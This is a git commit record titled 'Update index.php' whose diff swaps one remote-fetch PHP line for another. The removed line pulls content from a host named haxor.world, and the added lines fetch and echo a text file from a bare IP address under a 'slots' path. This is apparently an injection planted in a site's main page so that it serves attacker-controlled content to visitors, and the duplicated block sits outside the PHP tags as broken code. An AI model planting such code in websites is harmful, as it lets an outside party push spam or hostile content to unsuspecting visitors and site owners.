93e989ec11fb0f9774c8e1258769cb5130dabce6
OxygenCall <165064752+oxygencall@users.noreply.github.com>
2024-06-23 01:30:39 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,10 @@
-<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://haxor.world/mwah.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a; ?>
+<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://156.67.221.29/slots/beloved.txt'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a; ?>
+
+
+$curl = curl_init();
+$url = 'http://156.67.221.29/slots/beloved.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;
